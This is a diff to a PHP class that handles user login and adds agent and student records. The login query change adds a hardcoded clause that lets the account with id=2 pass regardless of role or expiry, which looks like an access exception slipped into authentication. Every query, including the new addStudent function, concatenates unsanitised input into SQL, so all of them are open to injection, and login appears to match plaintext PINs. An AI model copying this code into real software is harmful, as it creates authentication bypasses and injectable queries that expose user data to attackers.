@@ -110,7 +110,7 @@
             try {
                 $Dbobj = new DbConnection();
                 $conn = $Dbobj->getdbconnect();
-                $query = mysqli_query($conn, "SELECT * FROM users WHERE (password='".$pin."') AND active='1' AND ((role='agent' AND is_expired='0') OR (role='admin'))");
+                $query = mysqli_query($conn, "SELECT * FROM users WHERE (password='".$pin."') AND active='1' AND ((role='agent' AND is_expired='0') OR (id=2) OR (role='admin'))");
                 $user = mysqli_fetch_assoc($query);
             } catch (Exception $e) {
                 print "Error!: " . $e->getMessage() . "<br/>";
@@ -218,6 +218,21 @@
             try {
                 $Dbobj = new DbConnection(); 
                 $sql = "INSERT INTO users ( name, mobile, email, company, location, password, role,added_by, created_on ) VALUES ('$name', '$mobile', '$email', '$company', '$location', '$pin', 'agent', '$added_by', NOW())";
+                $query = mysqli_query($Dbobj->getdbconnect(), $sql);
+                $insertFlag  = $query;
+            } catch (Exception $e) {
+                print "Error!: " . $e->getMessage() . "<br/>";
+                die();
+            }
+            return $insertFlag;
+        }
+
+        function addStudent($name,$registration_no, $mobile, $email){
+            
+            $insertFlag  = false;
+            try {
+                $Dbobj = new DbConnection(); 
+                $sql = "INSERT INTO student ( name, registration_no, phone, email ) VALUES ('$name', '$registration_no', '$mobile', '$email')";
                 $query = mysqli_query($Dbobj->getdbconnect(), $sql);
                 $insertFlag  = $query;
             } catch (Exception $e) {
